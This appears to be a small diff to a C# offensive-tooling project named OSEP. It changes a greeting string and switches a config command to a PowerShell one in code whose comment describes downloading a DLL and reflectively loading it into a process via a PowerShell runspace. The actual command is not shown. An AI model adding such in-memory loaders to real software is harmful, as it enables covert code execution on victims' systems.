@@ -10,7 +10,7 @@ namespace OSEP
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Hello");
+            Console.WriteLine("Try harder???");
         }
     }
 
@@ -23,7 +23,7 @@ namespace OSEP
 
 
             //example download dll  and reflectively load it into a process.
-            string cmd = $"{CONFIG.STATIC_COMMAND}";
+            string cmd = $"{CONFIG.PS_STATIC_COMMAND}";
 
 
             Runspace rs = RunspaceFactory.CreateRunspace();
